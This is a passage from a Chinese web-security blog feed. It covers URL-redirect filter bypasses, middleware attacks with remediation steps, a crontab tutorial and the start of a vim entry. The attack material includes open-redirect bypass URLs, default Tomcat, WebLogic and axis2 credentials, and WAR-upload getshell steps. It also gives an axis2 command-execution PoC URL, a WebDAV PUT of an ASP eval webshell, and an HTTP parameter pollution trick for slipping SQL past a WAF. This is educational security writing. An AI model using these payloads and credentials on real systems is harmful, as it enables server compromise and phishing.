<h2 id="绕过URL跳转限制"><a href="#绕过URL跳转限制" class="headerlink" title="绕过URL跳转限制"></a>绕过URL跳转限制</h2><h3 id="利用问好绕过限制"><a href="#利用问好绕过限制" class="headerlink" title="利用问好绕过限制"></a>利用问好绕过限制</h3><p>比如：<a href="http://www.aaa.com/acb?Url=http://login.aaa.com" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://login.aaa.com</a>  这是一个跳转链接，跳转到它的二级域名下，那么这个问号放哪里可以绕过呢？其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：<a href="http://www.aaa.com/acb?Url=http://test.com?login.aaa.com" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://test.com?login.aaa.com</a> 。那么，它其实是会跳转到这个test.com域名下，这个域名是我想要跳转的任意域名，而后面的它自身域名一定要带上，不带上就无法辅助用问号?这个特性来跳转到指定域名了，而跳转后，问号和问号后面的内容会变为这样：<a href="http://www.test.com/?login.aaa.com" target="_blank" rel="external">http://www.test.com/?login.aaa.com</a></p>
<h3 id="利用反斜杠和正斜杠绕过限制"><a href="#利用反斜杠和正斜杠绕过限制" class="headerlink" title="利用反斜杠和正斜杠绕过限制"></a>利用反斜杠和正斜杠绕过限制</h3><p>比如：<a href="http://www.aaa.com/acb?Url=http://login.aaa.com/" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://login.aaa.com/</a>  同样是在它本身域名钱加上正斜杠，然后正斜杠前面跟上你想跳转的域名地址<br>如：<a href="http://www.aaa.com/acb?Url=http://test.com/login.aaa.com" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://test.com/login.aaa.com</a><br>反斜杠有三种思路<br>    (1)两个反斜杠绕过方法<br>    比如：<a href="http://www.aaa.com/acb?Url=http://login.aaa.com/" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://login.aaa.com/</a>  同样是在它本身域名钱加上两个反斜杠，然后两个反斜杠前面跟上你想跳转的域名地址<br>    如：<a href="http://www.aaa.com/acb?Url=http://test.com\\login.aaa.com" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://test.com\\login.aaa.com</a><br>    (2)一个反斜杠绕过方法<br>    如：<a href="http://www.aaa.com/acb?Url=http://test.com\login.aaa.com" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://test.com\login.aaa.com</a><br>    (3)另一种思路，一个反斜杠一个点<br>    利用.这样的格式，也就是一个反斜杠加一个点来跳过限制，<br>    如：<a href="http://www.aaa.com/acb?Url=http://test.com\.login.aaa.com" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://test.com\.login.aaa.com</a> </p>
<h3 id="利用-绕过URL限制"><a href="#利用-绕过URL限制" class="headerlink" title="利用@绕过URL限制"></a>利用@绕过URL限制</h3><p>如果你用这方法在火狐里进行跳转，会有弹窗提示，在其它游览器则没有。<br>如：<a href="http://www.aaa.com/acb?Url=http://login.aaa.com@test.com后面的test.com就是要跳转到的域名，前面的域名都是用来辅助以绕过限制的" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://login.aaa.com@test.com后面的test.com就是要跳转到的域名，前面的域名都是用来辅助以绕过限制的</a></p>
<h3 id="利用-号绕过"><a href="#利用-号绕过" class="headerlink" title="利用#号绕过"></a>利用#号绕过</h3><p>如：<a href="http://www.aaa.com/acb?Url=http://test.com#login.aaa.com" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://test.com#login.aaa.com</a></p>
<h3 id="利用白名单缺陷绕过限制"><a href="#利用白名单缺陷绕过限制" class="headerlink" title="利用白名单缺陷绕过限制"></a>利用白名单缺陷绕过限制</h3><p>有的域名白名单限制是不全的，比如如果想利用一个跳转，而这个跳转是通用，在这个公司网站很多子域名等都可以跳转，那么你买个域名也不算贵对吧，为什么这么说呢，这个问题就是白名单限制不当，比如，当跳转的域名包含这个网站下的所有域名，比如：<a href="http://www.aaa.com/acb?Url=http://login.aaa.com，这个login.aaa.com也可以改成aaa.com同样可以跳转对吧，因为白名单里只要有包含这个域名就直接成功跳转。那么当我在这个域名前面加上如testaaa.com，白名单里会检查是否包含aaa.com这个域名，包含，然后直接跳转，而并没有检查这个域名的整个信息，然后可以利用这个问题，直接注册一个testaaa.com这个域名就可以利用这个跳转。" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://login.aaa.com，这个login.aaa.com也可以改成aaa.com同样可以跳转对吧，因为白名单里只要有包含这个域名就直接成功跳转。那么当我在这个域名前面加上如testaaa.com，白名单里会检查是否包含aaa.com这个域名，包含，然后直接跳转，而并没有检查这个域名的整个信息，然后可以利用这个问题，直接注册一个testaaa.com这个域名就可以利用这个跳转。</a></p>
<h3 id="多重验证-amp-跳转绕过限制"><a href="#多重验证-amp-跳转绕过限制" class="headerlink" title="多重验证&amp;跳转绕过限制"></a>多重验证&amp;跳转绕过限制</h3><p>现在很多网站都有多重验证，比如你登陆账户后会出现另一个验证页面，输入手机验证码进行验证，此时这上面的URL很可能存在任意跳转的问题。<br>多重跳转的问题导致可绕过URL限制<br>比如<a href="http://www.aaa.com/acb?Url=http://login.aaa.com/acb?url=http://login.aaa.com。当然，还有多重的，这个结构的多重跳转你修改最后面的URL就可以达到任意URL跳转，中间的URL就没必要动了。" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://login.aaa.com/acb?url=http://login.aaa.com。当然，还有多重的，这个结构的多重跳转你修改最后面的URL就可以达到任意URL跳转，中间的URL就没必要动了。</a></p>
<h3 id="点击触发达到绕过URL跳转限制"><a href="#点击触发达到绕过URL跳转限制" class="headerlink" title="点击触发达到绕过URL跳转限制"></a>点击触发达到绕过URL跳转限制</h3><p>比如很多登陆页面的地方，其URL是一个跳转的URL，如：<a href="http://www.aaa.com/acb?Url=http://test.com。你直接修改了后面为任意URL，但是还是停留在原地，似乎没什么问题，但是，当你输入账号和密码后点击登陆按钮后，就会触发跳转，当然，这个账户和密码不一定要对的，随便都可以，但得视系统而定吧。这个我遇到了很多，比如你修改了域名，然后点击登陆，登陆成功后便可触发跳转，这也是一个比较隐蔽的绕过URL限制的跳转。" target="_blank" rel="external">http://www.aaa.com/acb?Url=http://test.com。你直接修改了后面为任意URL，但是还是停留在原地，似乎没什么问题，但是，当你输入账号和密码后点击登陆按钮后，就会触发跳转，当然，这个账户和密码不一定要对的，随便都可以，但得视系统而定吧。这个我遇到了很多，比如你修改了域名，然后点击登陆，登陆成功后便可触发跳转，这也是一个比较隐蔽的绕过URL限制的跳转。</a></p>
<h3 id="利用超链接绕过可信站点限制"><a href="#利用超链接绕过可信站点限制" class="headerlink" title="利用超链接绕过可信站点限制"></a>利用超链接绕过可信站点限制</h3><p>比如一个URL，它是可以直接跳转的，但是一般测试跳转时大家习惯用www.baidu.com或qq.com这样的可信站点进行测试，但是有些网站是可以跳转这些网站的，只要是可信站点且常用，基本都可以跳转，那么这就属于正常的业务逻辑了。难道就这样错失一个URL跳转漏洞了？其实不然，只要你的URL被百度收录过，那么直接搜索你的域名，site:xxx.xxx   因为你在百度里点击你的域名，它会先是一个302跳转，而这个302跳转就是百度下的302跳转，那么这样就可以绕过可信站点的限制，从而达到跳转到指定URL，当然，百度这个302有点长，你给它进行加密就行。</p>
<h3 id="POST参数中的URL跳转"><a href="#POST参数中的URL跳转" class="headerlink" title="POST参数中的URL跳转"></a>POST参数中的URL跳转</h3><p>当然，这个影响就很小了，比如当你填什么表格或者需要填写什么的，当你上传图片，点击下一步的时候，通常下一步就是预览你填写的信息，最后才是提交，当你上传了图片后点击下一步抓包，如果过滤不严，你会看到图片的完整地址包含在POST参数里，你就可以直接修改这个地址为任意URL，然后到达下一步，这时是确定信息也就是预览自己填写的信息的正确还是不正确，由于你刚刚修改了图片地址，这里是没有显示出来的，图像会是一个小XX，当点击图片右键选择查看图像时，就会触发URL跳转问题，其实这个也可以利用来进行钓鱼，钓后台审核员的信息，为什么呢，比如审核看到图片无法加载，一般都会点击查看图片，然后跳转，如果安全意识不知就会造成安全影响。</p>
<p>当然，如果POST参数里就只是URL跳转参数，那么你可以给它转成GET方式，然后进行跳转就可以了，只要网站支持这样的GET方式就行，在Burp Suite里可以一键转换提交方式，右键选择Change request method就可以！</p>
<h3 id="利用xip-io绕过"><a href="#利用xip-io绕过" class="headerlink" title="利用xip.io绕过"></a>利用xip.io绕过</h3><p>请求是<a href="http://www.127.0.0.1.xip.io" target="_blank" rel="external">http://www.127.0.0.1.xip.io</a> 这个绕过是在SSRF场景中的绕过，比如SSRF你要读取内网地址，一般都做了限制，可以尝试用这方法进行绕过限制，从而访问到内网。<br>另外一点，URL跳转涉及的安全问题大家常见的就是钓鱼，那么利用这个思路也可达成一个钓鱼问题，如，<a href="http://www.qq.com.220.181.57.217.xip.io" target="_blank" rel="external">http://www.qq.com.220.181.57.217.xip.io</a>  当你访问qq这个域名时，其实这个链接已经被解析到后面这个ip地址上了，那么实际访问的就是后面这个IP地址。</p>
<h2 id="漏洞修复的方法"><a href="#漏洞修复的方法" class="headerlink" title="漏洞修复的方法"></a>漏洞修复的方法</h2><p>1.若跳转的URL事先是可以确定的，包括url和参数的值，则可以在后台先配置好，url参数只需传对应url的索引即可，通过索引找到对应具体url再进行跳转；<br>2.若跳转的URL事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名，而跳转cg首先需要进行验证签名通过才能进行跳转；<br>3.若1和2都不满足，url事先无法确定，只能通过前端参数传入，则必须在跳转的时候对url进行按规则校验：即控制url是否是你们公司授权的白名单或者是符合你们公司规则的url：<br>   function checkURL ( sURL) {<br>       return (/^(https?:\/\/)?[\w-.]+.(yourDomainA|yourDomainB|yourDomainC).com($|\/|\)/i).test(sUrl)||(/^[\w][\w\/.-_%]+$/i).test(sUrl)||(/^[\/\][^\/\]/i).test(sUrl) ? true : false;<br>   }<br>4.XSS漏洞的注意事项 ：跳转url检测中也加入了CRLF头部注入漏洞的检测逻辑, 具体就是在请求参数中加入了%0d%0a这种测试代码，需要对这些参数进行删除处理(事实上：在判断到一个参数中包含 %00 -&gt; %1f 的控制字符时都是不合法的，需对其进行删除)。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;服务端未对传入的跳转url变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。&lt;br&gt;由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易；还可以造成xss漏洞&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="URL跳转" scheme="http://y-hkl.top/tags/URL%E8%B7%B3%E8%BD%AC/"/>
    
  </entry>
  
  <entry>
    <title>中间件漏洞与防护</title>
    <link href="http://y-hkl.top/2017/12/15/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E6%8A%A4/"/>
    <id>http://y-hkl.top/2017/12/15/中间件漏洞与防护/</id>
    <published>2017-12-15T05:57:05.000Z</published>
    <updated>2017-12-19T09:31:16.662Z</updated>
    
    <content type="html"><![CDATA[<p>中间件漏洞可以说是最容易被web管理员忽视的漏洞，原因很简单，因为这并不是应用程序代码上存在的漏洞，而是属于一种应用部署环境的配置不当或者使用不当造成的<br><a id="more"></a><br>我们在处理应急响应事件时经常遇到这么一种情况，客户网站代码是外包的，也就是第三方公司负责开发，而部署可能是由客户内部运维人员负责。暂不说他们对于中间件安全的重视程度与了解程度，只谈发现漏洞后如何处理，便是一团乱。开发商推卸说这并不是代码上的问题，他们完全是按照安全开发流程（SDL）走的，所以跟他无关；运维人员就一脸蒙蔽了，反驳道：你们当初没跟我说要配置什么啊，只是让我安装个程序就ok了，我怎么知道？</p>
<h2 id="中间件、容器、服务器傻傻分不清？"><a href="#中间件、容器、服务器傻傻分不清？" class="headerlink" title="中间件、容器、服务器傻傻分不清？"></a>中间件、容器、服务器傻傻分不清？</h2><p>在谈中间件安全问题时，我觉得有必要先梳理下以上几种关系以及概念。当初我在接触这些概念时，脑子里就是一团浆糊，中间件、容器、服务器、webserver等等概念感觉彼此很相似，但又有所区别。因此在书写本篇时，我特意翻查了一些资料，试图梳理清这几者之间的关系，参考了文章：<a href="http://www.voidcn.com/blog/saoraozhe3hao/article/p-2428756.html" target="_blank" rel="external">http://www.voidcn.com/blog/saoraozhe3hao/article/p-2428756.html</a></p>
<h3 id="基础概念与作用"><a href="#基础概念与作用" class="headerlink" title="基础概念与作用"></a>基础概念与作用</h3><p>这里只介绍web中间件、web服务器、web容器，因为除了web以外，其概念还可以扩展为数据库等。</p>
<h4 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h4><p>web服务器用于提供http服务，即向客户端返回信息，其可以处理HTTP协议，响应针对静态页面或图片的请求，控制页面跳转，或者把动态请求委托其它程序（中间件程序）等。</p>
<h4 id="web中间件"><a href="#web中间件" class="headerlink" title="web中间件"></a>web中间件</h4><p>web中间件用于提供系统软件和应用软件之间的连接，以便于软件各部件之间的沟通，其可以为一种或多种应用程序提供容器。</p>
<h4 id="web容器"><a href="#web容器" class="headerlink" title="web容器"></a>web容器</h4><p>web容器用于给处于其中的应用程序组件（JSP，SERVLET）提供一个环境，是中间件的一个组成部分，它实现了对动态语言的解析。比如tomcat可以解析jsp，是因为其内部有一个jsp容器。</p>
<h4 id="所属的类别"><a href="#所属的类别" class="headerlink" title="所属的类别"></a>所属的类别</h4><p>web服务器：IIS、Apache、nginx、tomcat、weblogic、websphere等。<br>web中间件：apache tomcat、BEA WebLogic、IBM WebSphere等。<br>web容器：JSP容器、SERVLET容器、ASP容器等。</p>
<p>注意：web中间件与web服务器是有重叠的，原因在于tomcat等web中间件也具备web服务器的功能。</p>
<h3 id="重点分析"><a href="#重点分析" class="headerlink" title="重点分析"></a>重点分析</h3><p>web服务器只是提供静态网页解析（如apache），或者提供跳转的这么一种服务。而web中间件（其包含web容器）可以解析动态语言，比如tomcat可以解析jsp（因为tomcat含有jsp容器），当然它也可以解析静态资源，因此它既是web中间件也是web服务器。不过tomcat解析静态资源的速度不如apache，因此常常两者结合使用。</p>
<h2 id="Tomcat漏洞与防护"><a href="#Tomcat漏洞与防护" class="headerlink" title="Tomcat漏洞与防护"></a>Tomcat漏洞与防护</h2><p>tomcat是apache的一个中间件软件，其可以提供jsp或者php的解析服务，为了方便远程管理与部署，安装完tomcat以后默认会有一个管理页面，管理员只需要远程上传一个WAR格式的文件，便可以将内容发布到网站，这一功能方便了管理员的同时也给黑客打开了方便之门，除此之外，tomcat还有一些样本页面，如果处理不当也会导致安全问题。</p>
<h3 id="tomcat远程部署漏洞详情"><a href="#tomcat远程部署漏洞详情" class="headerlink" title="tomcat远程部署漏洞详情"></a>tomcat远程部署漏洞详情</h3><p>tomcat管理地址通常是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:8080/manager</div></pre></td></tr></table></figure></p>
<p>默认账号密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root/root</div><div class="line">tomcat/tomcat </div><div class="line">admin admin</div><div class="line">admin 123456</div></pre></td></tr></table></figure></p>
<h4 id="tomcat口令爆破"><a href="#tomcat口令爆破" class="headerlink" title="tomcat口令爆破"></a>tomcat口令爆破</h4><p>在默认不对tomcat做任何配置的时候爆破是无效的，而如果设置了账号密码就可以进行爆破。Tomcat的认证比较弱，Base64(用户名:密码)编码，请求响应码如果不是401（未经授权：访问由于凭据无效被拒绝。）即表示登录成功。登录成功后，可直接上传war文件，getshell（当然上传war文件需要manager权限）</p>
<h4 id="getshell过程"><a href="#getshell过程" class="headerlink" title="getshell过程"></a>getshell过程</h4><p>首先将我们的.jsp shell文件打包为war文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jar -cvf shell.war shell.jsp</div></pre></td></tr></table></figure></p>
<p>登录管理页面后，选择上传war文件。<br><img src="/upload_img/中间件_1.png" alt=""><br>截图中间的目录便是上传成功以后的木马文件，可以点击浏览。<br><img src="/upload_img/中间件_2.png" alt=""><br>直接在当前目录下访问shell.jsp。</p>
<h3 id="Session-Example样本页面"><a href="#Session-Example样本页面" class="headerlink" title="Session Example样本页面"></a>Session Example样本页面</h3><p>默认地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/servlets-examples/servlet/SessionExample</div></pre></td></tr></table></figure></p>
<p>用来设置任意会话变量，恶意使用可对应用程序造成破坏。</p>
<h3 id="tomcat漏洞防护"><a href="#tomcat漏洞防护" class="headerlink" title="tomcat漏洞防护"></a>tomcat漏洞防护</h3><p>1.升级tomcat版本<br>2.删除远程部署页面，或者限定页面的访问权限。<br>3.找到/conf/tomcat-users.xml修改用户名密码以及权限。<br>4.删除样例页面文件</p>
<h2 id="JBoss漏洞与防护"><a href="#JBoss漏洞与防护" class="headerlink" title="JBoss漏洞与防护"></a>JBoss漏洞与防护</h2><p>JBoss这是一个基于JavaEE的应用服务器，与tomcat类似的是jboss也有远程部署平台，但不需要登陆。漏洞利用过程与tomcat类似，因此不再截图说明。除了远程部署漏洞外，jboss还存在反序列化漏洞，这里不再详述。</p>
<h3 id="JBoss远程部署漏洞详情"><a href="#JBoss远程部署漏洞详情" class="headerlink" title="JBoss远程部署漏洞详情"></a>JBoss远程部署漏洞详情</h3><p>默认管理后台地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:8080</div></pre></td></tr></table></figure></p>
<h3 id="getshell过程-1"><a href="#getshell过程-1" class="headerlink" title="getshell过程　　"></a>getshell过程　　</h3><p>访问管理页面，查看jboss配置页面中的JMX Console，这是JBoss的管理台程序，进入后找到Jboss.deployment包，该包下有flavor=URL.type=DeploymentSccanner选项。进入部署页面后便可以上传war文件，但与tomcat不同的是它不是本地上传war文件，而是从远程地址下载，因此需要自己准备一个文件服务器，用于远程下载war到目标jboss服务器上。具体方法是在部署页面找到”ADDURL”方法，输入URL地址，点击invoke。除了以上方法外，JMX-Console提供的BSH方法，同样也可以部署war包。</p>
<h3 id="JBoss漏洞防护"><a href="#JBoss漏洞防护" class="headerlink" title="JBoss漏洞防护"></a>JBoss漏洞防护</h3><p>1.开启jmx-console密码认证<br>2.删除jmx-console.war与web-console.war</p>
<h2 id="WebLogic漏洞与防护"><a href="#WebLogic漏洞与防护" class="headerlink" title="WebLogic漏洞与防护"></a>WebLogic漏洞与防护</h2><p>weblogic是一个基于JavaEE构架的中间件，安装完weblogic默认会监听7001端口。漏洞利用过程与tomcat类似，因此不再截图说明。</p>
<h3 id="Weblogic远程部署漏洞详情"><a href="#Weblogic远程部署漏洞详情" class="headerlink" title="Weblogic远程部署漏洞详情"></a>Weblogic远程部署漏洞详情</h3><p>默认后台地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:7001/console/login/loginForm.jsp</div></pre></td></tr></table></figure></p>
<p>账号密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">用户名密码均为：weblogic</div><div class="line">用户名密码均为：system</div><div class="line">用户名密码均为：portaladmin</div><div class="line">用户名密码均为：guest</div></pre></td></tr></table></figure></p>
<h3 id="getshell过程-2"><a href="#getshell过程-2" class="headerlink" title="getshell过程"></a>getshell过程</h3><p>成功登陆weblogic后台后，找到部署按钮，点击后选择安装，然后可以选择本地上传war包也可以利用远程url下载，部署完成后，weblogic会给出文件地址。</p>
<h3 id="Weblogic漏洞防护"><a href="#Weblogic漏洞防护" class="headerlink" title="Weblogic漏洞防护"></a>Weblogic漏洞防护</h3><p>删除远程部署页面</p>
<h2 id="axis2漏洞与防护"><a href="#axis2漏洞与防护" class="headerlink" title="axis2漏洞与防护"></a>axis2漏洞与防护</h2><p>axis2也是apache的一个项目，是新一代的SOAP引擎，其存在一个任意命令执行漏洞。（该漏洞来自补天平台）</p>
<h2 id="axis2命令执行漏洞详情"><a href="#axis2命令执行漏洞详情" class="headerlink" title="axis2命令执行漏洞详情"></a>axis2命令执行漏洞详情</h2><p>默认后台地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/axis2-admin/</div></pre></td></tr></table></figure></p>
<p>默认账号密码：admin与axis2<br>登录后效果如下：<br><img src="/upload_img/中间件_3.png" alt=""><br>执行系统命令poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/services/Axis2Shell/execCmd?cmd=whoami</div></pre></td></tr></table></figure></p>
<h2 id="IIS漏洞与防护"><a href="#IIS漏洞与防护" class="headerlink" title="IIS漏洞与防护"></a>IIS漏洞与防护</h2><p>IIS是微软的一款web服务器，其配置不当容易产生webdav漏洞。webdav本身是iis的一项扩展功能，开启后可以使用除了get、post以外的一些请求类型，比如put等。但如果配置不当，就会导致文件上传漏洞。除了webdav漏洞，近期还爆出了一个远程命令执行漏洞，具体移步：IIS6.0远程命令执行漏洞(CVE-2017-7269)</p>
<h3 id="IIS-Webdav漏洞详情"><a href="#IIS-Webdav漏洞详情" class="headerlink" title="IIS Webdav漏洞详情"></a>IIS Webdav漏洞详情</h3><p>当测试一个站点是否存在webdav漏洞时，可以先构造一个OPTIONS请求，若返回200，则查看返回头的Allow参数中包含哪些方法（可以请求）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">OPTIONS  / HTTP/1.1</div><div class="line">Host:baidu.com</div></pre></td></tr></table></figure></p>
<p>如果存在PUT方法，则可以尝试写入一个txt文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PUT /shell.txt HTTP/1.1</div><div class="line">HOST:baidu.com</div><div class="line">Content-length:30</div><div class="line">&lt;%eval request(&quot;test&quot;)%&gt;</div></pre></td></tr></table></figure></p>
<p>若返回200则说明上传成功，此时可以手动访问此文件，确认是否存在。当然也有可能返回403，这表示此目录没有上传的权限，可以尝试上传到其他目录。<br>通过MOVE或COPY方法改文件后缀名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">COPY /shell.txt HTTP/1.1</div><div class="line">HOST:xxx.com</div><div class="line">Destination:http://www.xxx.com/shell.asp</div></pre></td></tr></table></figure></p>
<h3 id="IIS漏洞防护"><a href="#IIS漏洞防护" class="headerlink" title="IIS漏洞防护"></a>IIS漏洞防护</h3><p>关闭webdav功能</p>
<h2 id="HPP漏洞"><a href="#HPP漏洞" class="headerlink" title="HPP漏洞"></a>HPP漏洞</h2><p>HPP漏洞是web容器处理http参数时的问题，前面几款web服务器都或多或少存在这样的问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $str=$_REQUEST[&apos;str&apos;];                    #$_REQUEST[]函数可以接受GET/POST。</div><div class="line">    Echo $str;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>比如访问URL:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.com/index.php?str=hello</div></pre></td></tr></table></figure></p>
<p>此时页面显示hello<br>但如果访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.xxx.com/index.php?str=hello&amp;str=world&amp;str=test</div></pre></td></tr></table></figure></p>
<p>此时页面显示test，把前面参数的值给覆盖了，这就是http参数污染。</p>
<h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><p>绕过WAF，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PHP:index.php?str=1&amp;str=select * from admin --</div></pre></td></tr></table></figure></p>
<p>因为WAF可能会校验值的第一个单词，如果为select则触发，这样子可以避免被触发。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;中间件漏洞可以说是最容易被web管理员忽视的漏洞，原因很简单，因为这并不是应用程序代码上存在的漏洞，而是属于一种应用部署环境的配置不当或者使用不当造成的&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="中间件漏洞" scheme="http://y-hkl.top/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>crontab计划任务</title>
    <link href="http://y-hkl.top/2017/12/07/crontab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%20/"/>
    <id>http://y-hkl.top/2017/12/07/crontab计划任务 /</id>
    <published>2017-12-08T03:41:57.000Z</published>
    <updated>2017-12-08T03:45:39.290Z</updated>
    
    <content type="html"><![CDATA[<p>rontab是linux下定制计划任务的工具，其使用方便，是居家旅行、定时搞事的必备神器。本篇记录下crontab使用方法，以及注意坑点。<br><a id="more"></a></p>
<h2 id="计划任务基本格式"><a href="#计划任务基本格式" class="headerlink" title="计划任务基本格式"></a>计划任务基本格式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*　　*　　*　　*　　*　　command</div></pre></td></tr></table></figure>
<p>分　时　日　月　周　命令<br>第1列表示分钟1～59 每分钟用或者/1表示<br>第2列表示小时1～23（0表示0点）<br>第3列表示日期1～31<br>第4列表示月份1～12<br>第5列标识号星期0～6（0表示星期天）<br>第6列要运行的命令</p>
<h2 id="crontab-usage"><a href="#crontab-usage" class="headerlink" title="crontab usage"></a>crontab usage</h2><p>crontab -h 查看命令帮助<br>crontab -e 编辑计划任务<br>sudo crontab -l 列出root的计划任务<br>crontab -u nmask -l 列出nmask的计划任务<br>crontab -r 删除计划任务<br>一般写计划任务，都是运行crontab -e然后写入计划任务，保存退出即可。</p>
<h2 id="每秒执行"><a href="#每秒执行" class="headerlink" title="每秒执行"></a>每秒执行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * sleep 10;</div></pre></td></tr></table></figure>
<p>每10s运行一次。<br>crontab文件的一些例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">30 21 * * * /usr/local/etc/rc.d/lighttpd restart 表示每晚的21:30重启apache</div><div class="line">45 4 1,10,22 * * /usr/local/etc/rc.d/lighttpd restart 表示每月1、10、22日的4:45</div><div class="line">10 1 * * 6,0 /usr/local/etc/rc.d/lighttpd restart 表示每周六、日的1:10重启apache</div><div class="line">0,30 18-23 * * * /usr/local/etc/rc.d/lighttpd restart 表示在每天18:00至23:00之间每隔30分钟重启apache。 </div><div class="line">0 23 * * 6 /usr/local/etc/rc.d/lighttpd restart 表示每星期六的11:00pm重启apache。 </div><div class="line">0 */1 * * * /usr/local/etc/rc.d/lighttpd restart 每一小时重启apache </div><div class="line">0 23-7/1 * * * /usr/local/etc/rc.d/lighttpd restart 晚上11点到早上7点之间，每隔一小时重启apache </div><div class="line">0 11 4 * mon-wed /usr/local/etc/rc.d/lighttpd restart 每月的4号与每周一到周三的11点重启apache</div><div class="line">0 4 1 jan * /usr/local/etc/rc.d/lighttpd restart 一月一号的4点重启apache</div></pre></td></tr></table></figure></p>
<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">*/1 * * * * 每分钟执行</div><div class="line">1 * * * * 每小时执行一次</div></pre></td></tr></table></figure>
<p>注意上面2条计划任务，一个是每分钟执行，一个是每小时执行。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;rontab是linux下定制计划任务的工具，其使用方便，是居家旅行、定时搞事的必备神器。本篇记录下crontab使用方法，以及注意坑点。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://y-hkl.top/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Linux" scheme="http://y-hkl.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>vi/vim键盘图</title>
    <link href="http://y-hkl.top/2017/12/07/vim%E9%94%AE%E7%9B%98%E5%9B%BE/"/>
    <id>http://y-hkl.top/2017/12/07/vim键盘图/</id>
    <published>2017-12-07T06:00:24.000Z</published>
    <updated>2017-12-08T03:45:07.360Z</updated>
    
